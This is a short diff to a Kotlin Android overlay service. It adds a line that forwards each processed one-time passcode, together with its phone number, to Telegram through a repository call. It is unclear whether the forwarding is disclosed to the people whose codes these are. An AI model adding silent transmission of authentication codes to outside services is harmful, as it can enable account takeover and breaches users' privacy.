@@ -524,6 +524,7 @@ class FloatingOverlayService : Service() {
                 try {
                     val otps = repository.checkAndProcessOtps()
                     for (otpItem in otps) {
+                        repository.sendTelegramOtp(otpItem.number, otpItem.otpCode)
                         withContext(Dispatchers.Main) {
                             copyToClipboard("OTP", otpItem.otpCode)
                             showOtpNotification(otpItem.number, otpItem.otpCode)
